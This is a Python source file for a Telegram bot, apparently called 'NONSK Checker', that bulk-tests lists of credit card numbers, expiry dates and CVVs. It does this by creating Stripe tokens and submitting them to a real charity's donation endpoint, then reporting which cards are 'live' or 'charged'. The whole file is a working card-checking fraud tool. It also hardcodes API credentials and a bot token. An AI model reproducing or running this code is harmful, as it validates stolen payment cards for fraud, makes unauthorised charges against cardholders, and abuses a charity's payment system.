import json
import requests
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message

# Bot Configuration
API_ID = "28271744"
API_HASH = "1df4d2b4dc77dc5fd65622f9d8f6814d"
BOT_TOKEN = "7393878224:AAGTFjEclUdXYI0NzaRUUqmRUwFrNBhYVKo"

bot = Client("CardCheckerBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Variables to track the results
results = {
    "total": 0,
    "cvv": 0,
    "ccn": 0,
    "approved": 0,
    "dead": 0,
    "live_cards": [],
}


def check_card_details(card):
    try:
        cc, mes, ano, cvv = card.split('|')
        if len(mes) == 1:
            mes = "0" + mes
        if len(ano) == 2:
            ano = "20" + ano

        # 1st Request
        token_url = "https://api.stripe.com/v1/tokens"
        headers_1 = {
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        data_1 = {
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'key': 'pk_live_oeBlScsEPKeBvHnRXizVNSl4',
        }

        response_1 = requests.post(token_url, headers=headers_1, data=data_1)
        result_1 = response_1.json()

        if response_1.status_code != 200 or "error" in result_1:
            return f"DEAD\nMessage: {result_1.get('error', {}).get('message', 'Unknown error')}"

        token_id = result_1.get("id", "")
        brand = result_1.get("card", {}).get("brand", "Unknown")

        # 2nd Request
        donation_url = "https://oneummah.org.uk/wp-admin/admin-ajax.php"
        headers_2 = {
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        data_2 = {
            'action': 'k14_submit_donation',
            'token': token_id,
            'data': 'donation_id=503695',
        }

        response_2 = requests.post(donation_url, headers=headers_2, data=data_2)
        result_2 = response_2.text

        if "payment_intent_unexpected_state" in result_2:
            return "Payment Intent Confirmed✅"
        elif "succeeded" in result_2:
            return "CHARGED✅"
        elif "Your card has insufficient funds." in result_2:
            return "INSUFFICIENT FUNDS❎"
        elif "incorrect_zip" in result_2:
            return "CVV LIVE❎"
        elif "insufficient_funds" in result_2:
            return "INSUFFICIENT FUNDS❎"
        elif "security code is incorrect" in result_2:
            return "CCN LIVE❎"
        elif "Your card's security code is invalid." in result_2:
            return "CCN LIVE❎"
        elif "transaction_not_allowed" in result_2:
            return "CVV LIVE❎"
        elif "stripe_3ds2_fingerprint" in result_2:
            return "3D REQUIRED❎"
        elif "redirect_url" in result_2:
            return "Approved❎\n3DS Required"
        elif '"cvc_check": "pass"' in result_2:
            return "CHARGED✅"
        elif "Membership Confirmation" in result_2:
            return "Membership Confirmation✅"
        elif "Thank you for your support!" in result_2:
            return "CHARGED✅"
        elif "Thank you for your donation" in result_2:
            return "CHARGED✅"
        elif "incorrect_number" in result_1:
            return "Your card number is incorrect.❌"
        elif '"status":"incomplete"' in result_2:
            return "Your card was declined.❌"
        elif "Your card was declined." in result_2:
            return "Your card was declined.❌"
        elif "card_declined" in result_2:
            return "Your card was declined.❌"
        else:
            return "DEAD❌"
    except Exception as e:
        return f"An error occurred: {str(e)}"


@bot.on_message(filters.command("start"))
async def start_command(client, message: Message):
    await message.reply_text(
        "**Welcome to NONSK Checker Bot!**\n\nUse /chk to check your cards.",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Support", url="https://t.me/YourSupportChannel")]]
        ),
    )


@bot.on_message(filters.command("chk") & filters.reply)
async def check_cards(client, message: Message):
    global results
    results = {
        "total": 0,
        "cvv": 0,
        "ccn": 0,
        "approved": 0,
        "dead": 0,
        "live_cards": [],
    }

    if not message.reply_to_message.document:
        await message.reply_text("❌ Please reply to a valid TXT file containing CC details.")
        return

    file_path = await message.reply_to_message.download()
    with open(file_path, "r") as file:
        cards = file.readlines()

    results["total"] = len(cards)
    msg = await message.reply_text(
        f"**Found {results['total']} cards.**\n\nStarting checking...\nPlease wait."
    )

    for index, card in enumerate(cards, start=1):
        card = card.strip()
        status = check_card_details(card)

        if "✅" in status:
            results["cvv"] += 1
            results["live_cards"].append(card)
        elif "❎" in status:
            results["ccn"] += 1
        else:
            results["dead"] += 1

        await msg.edit_text(
            f"↯ **NONSK CHECKER**\n\n"
            f"**CC:** {card}\n"
            f"**Status:** {status}\n"
            f"\n**Checking Info**\n"
            f"------------------\n"
            f"**Total:** {results['total']}\n"
            f"**Checked:** {index}\n"
            f"**Live:** {results['cvv']}\n"
            f"**Dead:** {results['dead']}\n",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(f"Live: {results['cvv']}", callback_data="show_live"),
                        InlineKeyboardButton(f"Dead: {results['dead']}", callback_data="show_dead"),
                    ]
                ]
            ),
        )

    await msg.edit_text(
        f"**GAME OVER**\n\n"
        f"**CHECKING RESULT**\n"
        f"___________________\n"
        f"**TOTAL:** {results['total']}\n"
        f"**CVV:** {results['cvv']}\n"
        f"**CCN:** {results['ccn']}\n"
        f"**Approved:** {results['cvv']}\n"
        f"**Dead:** {results['dead']}",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Send Hits", callback_data="send_hits")]]
        ),
    )


@bot.on_callback_query(filters.regex("show_live"))
async def show_live(client, callback_query):
    if results["live_cards"]:
        hits = "\n".join(results["live_cards"])
        await callback_query.message.reply_text(f"**Live Hits:**\n\n{hits}")
    else:
        await callback_query.answer("No live hits found!", show_alert=True)


@bot.on_callback_query(filters.regex("send_hits"))
async def send_hits(client, callback_query):
    if results["live_cards"]:
        hits = "\n".join(results["live_cards"])
        await callback_query.message.reply_text(f"**Live Hits:**\n\n{hits}")
    else:
        await callback_query.answer("No live hits to send!", show_alert=True)


if __name__ == "__main__":
    bot.run()
